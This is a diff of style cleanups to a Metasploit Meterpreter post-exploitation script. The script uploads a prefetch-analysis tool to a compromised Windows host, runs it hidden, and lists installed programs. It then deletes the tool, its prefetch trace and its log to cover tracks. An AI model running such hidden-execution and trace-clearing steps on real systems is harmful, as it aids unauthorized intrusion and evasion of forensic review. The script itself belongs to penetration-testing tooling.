@@ -1,21 +1,21 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
-
-
-#Meterpreter script for extracting information from windows prefetch folder
-#Provided by Milo at keith.lee2012[at]gmail.com
-#Verion: 0.1.0
+# Meterpreter script for extracting information from windows prefetch folder
+# Provided by Milo at keith.lee2012[at]gmail.com
+# Verion: 0.1.0
 
 require 'fileutils'
 require 'net/http'
 require 'digest/sha1'
 
 @session = client
-@host,@port = @session.session_host, session.session_port
+@host = @session.session_host
+@port = session.session_port
 
 # Script Options
 @@exec_opts = Rex::Parser::Arguments.new(
@@ -35,7 +35,7 @@ def read_program_list
   sfmsvals = key.enum_key
   sfmsvals.each do |test1|
     begin
-      key2 = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"+test1
+      key2 = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\" + test1
       root_key2, base_key2 = @session.sys.registry.splitkey(key2)
       value1 = "DisplayName"
       value2 = "DisplayVersion"
@@ -48,17 +48,16 @@ def read_program_list
   end
 end
 
-def prefetch_dump(options, logging=false)
-
+def prefetch_dump(options, logging = false)
   lexe = File.join(Msf::Config.data_directory, "prefetch.exe")
-  rexe = sprintf("%.5d",rand(100000)) + ".exe"
-  rlog = sprintf("%.5d",rand(100000)) + ".txt"
+  rexe = sprintf("%.5d", rand(100000)) + ".exe"
+  rlog = sprintf("%.5d", rand(100000)) + ".txt"
 
   print_status("Uploading Prefetch-tool for analyzing Prefetch folder...")
   begin
     @session.fs.file.upload_file("#{@tempdir}\\#{rexe}", lexe)
     print_status("Prefetch-tool uploaded as #{@tempdir}\\#{rexe}")
-  rescue ::Interrupt; raise $!
+  rescue ::Interrupt; raise $ERROR_INFO
   rescue ::Exception => e
     print_status("The following error was encountered: #{e.class} #{e}")
     return
@@ -66,25 +65,21 @@ def prefetch_dump(options, logging=false)
 
   begin
 
-    if(logging)
-      options += " --txt=#{@tempdir}\\#{rlog}"
-    end
+    options += " --txt=#{@tempdir}\\#{rlog}" if logging
 
-    r = @session.sys.process.execute("cmd.exe /c #{@tempdir}\\#{rexe} #{options} #{rlog}", nil, {'Hidden' => 'true','Channelized' => true})
-    while(d = r.channel.read)
+    r = @session.sys.process.execute("cmd.exe /c #{@tempdir}\\#{rexe} #{options} #{rlog}", nil, 'Hidden' => 'true', 'Channelized' => true)
+    while (d = r.channel.read)
       d.split("\n").each do |out|
         print_status("OUT> #{out.strip}")
       end
     end
 
     found = true
-    while (not found)
+    until found
       found = false
-      @session.sys.process.get_processes().each do |x|
+      @session.sys.process.get_processes.each do |x|
         found = false
-        if (x['name'].downcase == rexe)
-          found = true
-        end
+        found = true if x['name'].downcase == rexe
       end
       sleep(0.5) if found
     end
@@ -93,34 +88,31 @@ def prefetch_dump(options, logging=false)
     r.close
 
     print_status("Deleting #{rexe} from target...")
-    @session.sys.process.execute("cmd.exe /c del #{@tempdir}\\#{rexe}", nil, {'Hidden' => 'true'})
+    @session.sys.process.execute("cmd.exe /c del #{@tempdir}\\#{rexe}", nil, 'Hidden' => 'true')
 
     print_status("Clearing prefetch-tool prefetch entry ...")
-    @session.sys.process.execute("cmd.exe /c del %windir%\\prefetch\\#{rexe.gsub('.exe','')}*.pf", nil, {'Hidden' => 'true'})
+    @session.sys.process.execute("cmd.exe /c del %windir%\\prefetch\\#{rexe.gsub('.exe', '')}*.pf", nil, 'Hidden' => 'true')
 
-    if(logging)
+    if logging
       logfile = ::File.join(Msf::Config.config_directory, 'logs', 'prefetch', @host + "-" + ::Time.now.strftime("%Y%m%d.%M%S") + ".log")
       print_status("[*] Saving prefetch logs to #{logfile}...")
       @session.fs.file.download_file(logfile, "#{@tempdir}\\#{rlog}")
       print_status("[*] Deleting log file from target...")
-      @session.sys.process.execute("cmd.exe /c del #{@tempdir}\\#{rlog}", nil, {'Hidden' => 'true'})
+      @session.sys.process.execute("cmd.exe /c del #{@tempdir}\\#{rlog}", nil, 'Hidden' => 'true')
     end
 
-  rescue ::Interrupt; raise $!
+  rescue ::Interrupt; raise $ERROR_INFO
   rescue ::Exception => e
     print_status("The following error was encountered: #{e.class} #{e}")
     return
   end
 end
 
-
-#check for proper Meterpreter Platform
+# check for proper Meterpreter Platform
 def unsupported
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
 end
-
-
 
 ################## MAIN ##################
 
@@ -129,7 +121,7 @@ logging       = false
 view_list     = false
 check_update  = false
 
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, val|
   case opt
   when "-x"
     options += " --x=" + val
@@ -142,15 +134,15 @@ check_update  = false
   when "-l"
     logging = true
   when "-h"
-    print_status( "Prefetch-tool Meterpreter Script")
+    print_status("Prefetch-tool Meterpreter Script")
     print_line(@@exec_opts.usage)
     raise Rex::Script::Completed
   end
-}
+end
 unsupported if client.platform !~ /win32|win64/i
 prefetch_local = ::File.join(Msf::Config.data_directory, "prefetch.exe")
 
-if !(::File.exist?(prefetch_local))
+if !::File.exist?(prefetch_local)
   print_status("No local copy of prefetch.exe, downloading from the internet...")
   Net::HTTP.start("prefetch-tool.googlecode.com") do |http|
     req  = Net::HTTP::Get.new("/files/prefetch.exe")
@@ -169,10 +161,10 @@ else
     resp    = http.request(req)
     body    = resp.body
     chksum  = body.scan(/SHA1 Checksum: <\/th><td style="white-space:nowrap">.* <a href/)[0]
-    chksum.sub!(/SHA1 Checksum: <\/th><td style="white-space:nowrap"> /,'')
-    chksum.sub!(/ <a href/,'')
+    chksum.sub!(/SHA1 Checksum: <\/th><td style="white-space:nowrap"> /, '')
+    chksum.sub!(/ <a href/, '')
 
-    if (digest != chksum)
+    if digest != chksum
       print_status("Downloading an updated version of prefetch.exe to #{prefetch_local}...")
       Net::HTTP.start("prefetch-tool.googlecode.com") do |http|
         req  = Net::HTTP::Get.new("/files/prefetch.exe")
@@ -186,10 +178,7 @@ else
   end
 end
 
-if (view_list)
-  read_program_list()
-end
+read_program_list if view_list
 
 print_status("Running Prefetch-tool script...")
 prefetch_dump(options, logging)
-
